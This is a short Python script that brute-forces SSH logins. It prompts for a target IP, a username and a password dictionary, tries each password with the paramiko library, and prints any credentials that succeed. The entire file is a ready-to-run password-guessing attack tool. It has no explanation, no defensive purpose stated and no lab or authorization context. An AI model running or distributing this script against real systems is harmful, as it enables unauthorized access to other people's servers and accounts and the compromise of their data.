#!/usr/bin/env python3

import socket,os,sys,paramiko

global host, username, file

try:
    host=input("\nPlease Enter Target IP: ")
    username=input("\nPlease Enter The Username: ")
    file=input("\nPlease Enter Password Dictionary With Full Path: ")
    if os.path.exists(file) == False:
        print("\nFile Doesnt Exists :(")
        sys.exit()
    else:
        print("\nLoading The Password File :)")
except KeyboardInterrupt:
   print("\nUser Stopped The Script :(")
   sys.exit()

def ssh_connect(password,code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host,port=22,username=username,password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2
    ssh.close()
    return code

file = open(file)

for word in file.readlines():
    password=word.strip("\n")
    try:
        prob=ssh_connect(password)
        if prob == 0:
            print("\nUser: %s Password: %s"%(username,password))
        elif prob == 2:
            print ("\nNetwork Error")
            sys.exit()
    except Exception:
        print(Exception)
        pass

file.close()
